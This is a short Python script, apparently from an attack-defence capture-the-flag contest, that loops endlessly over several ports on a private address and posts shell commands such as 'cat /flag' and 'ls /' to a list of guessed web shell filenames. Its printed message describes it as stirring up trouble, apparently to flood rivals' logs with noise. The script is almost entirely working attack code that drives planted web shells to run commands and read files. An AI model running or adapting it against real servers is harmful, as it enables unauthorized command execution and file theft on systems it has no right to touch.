import requests
import time


shell_file={'shell.php','123.php','web.php','x.php','404.php','index.php'}
payload={'cat /flag','ls -al','flag','ls /','echo flag','cat /index.php'}
while(1):
    for i in range(8801,8804):
        for ii in shell_file:
            url='http://192.168.76.156:'+str(i)+'/'+ii
            for iii in payload:
                data={
                    'cmd':iii
                }
                try:
                    requests.post(url,data=data)
                    print('正在搅屎：'+i+'|'+ii+'|'+iii)
                    time.sleep(0.5)
                except Exception as e:
                    pass
